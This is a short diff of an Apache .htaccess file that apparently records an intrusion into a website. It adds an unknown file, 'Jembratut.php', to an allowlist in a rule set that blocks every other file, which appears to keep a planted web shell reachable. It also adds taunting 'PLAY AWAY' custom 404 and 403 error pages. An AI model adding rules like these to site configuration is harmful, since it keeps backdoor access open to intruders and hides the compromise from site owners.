@@ -2,7 +2,7 @@
  Order allow,deny
  Deny from all
 </FilesMatch>
-<FilesMatch "^(index.php|index.html|wle.php)$">
+<FilesMatch "^(index.php|index.html|wle.php|Jembratut.php)$">
  Order allow,deny
  Allow from all
 </FilesMatch>
@@ -15,3 +15,5 @@ RewriteCond %{REQUEST_FILENAME} !-f
 RewriteCond %{REQUEST_FILENAME} !-d
 RewriteRule . /index.php [L]
 </IfModule>
+ErrorDocument 404 "<title>PLAY AWAY.</title><center><pre>404 Not Found Kidss!!</pre></center>"
+ErrorDocument 403 "<title>PLAY AWAY.</title><center><pre>403 Forbidden Kidss!!</pre></center>"
